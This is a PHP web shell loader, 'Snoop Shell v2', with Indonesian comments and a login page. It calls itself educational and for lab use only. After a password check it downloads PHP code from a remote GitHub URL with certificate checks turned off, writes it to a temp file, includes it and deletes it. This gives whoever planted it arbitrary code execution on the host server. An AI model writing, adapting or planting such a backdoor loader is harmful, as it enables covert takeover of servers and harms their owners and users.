<?php
/**
 * Snoop Shell v2 – Secure Educational Shell
 * Author: EduSecure
 * Note: Gunakan hanya di lab, sandbox, atau lingkungan pribadi.
 */

session_start();
error_reporting(0);

// ====== Konfigurasi Utama ======
define('ZPASSWORD_HASH', '$2y$10$POGWvpSABO4dZsol.Cm.rueYu9jnrN1qWeQ.wQN7To0lNWTRWqHli'); // password hash
define('SESSION_TIMEOUT', 900); // 15 menit
define('REMOTE_CODE_URL', 'https://raw.githubusercontent.com/callsnoop/shellsnoop/refs/heads/main/alfanopass.txt');

// ====== Keamanan Session ======
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity']) > SESSION_TIMEOUT) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
$_SESSION['last_activity'] = time();

function is_logged_in() {
    return isset($_SESSION['snoop_logged_in']) && $_SESSION['snoop_logged_in'] === true;
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function get_remote_script($url) {
    $methods = [
        'curl_exec'    => 'curl_exec',
        'file_get'     => 'file_get_contents',
        'stream_get'   => function($url) {
            $handle = @fopen($url, "r");
            if ($handle) {
                $data = @stream_get_contents($handle);
                fclose($handle);
                return $data;
            }
            return false;
        }
    ];

    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT      => "Mozilla/5.0",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
        ]);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists('file_get_contents')) {
        return @file_get_contents($url);
    } elseif (function_exists('stream_get_contents')) {
        return $methods['stream_get']($url);
    }

    return false;
}

if (is_logged_in()) {
    $payload = get_remote_script(REMOTE_CODE_URL);

    if ($payload !== false && str_starts_with(trim($payload), "<?php")) {
        $temp = tempnam(sys_get_temp_dir(), 'zh_') . '.php';
        file_put_contents($temp, $payload);
        include $temp;
        unlink($temp);
    } else {
        echo "<div style='color:red;text-align:center;margin-top:2rem;'>Gagal memuat skrip eksternal atau tidak valid.</div>";
    }

} else {
    // Proses Login
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], ZPASSWORD_HASH)) {
            $_SESSION['snoop_logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Password salah.";
        }
    }

    // Halaman Login
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Snoop Shell Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-dark text-light d-flex justify-content-center align-items-center vh-100">
        <div class="container text-center">
            <h2>Let's Fly High!</h2>
            <?php if (isset($error)) echo "<div class='alert alert-danger mt-3'>$error</div>"; ?>
            <form method="POST" class="mt-4">
                <input type="password" name="password" class="form-control mb-3" placeholder="Masukkan Password" required>
                <button type="submit" class="btn btn-primary">Masuk</button>
            </form>
        </div>
    </body>
    </html>
    <?php
}
?>
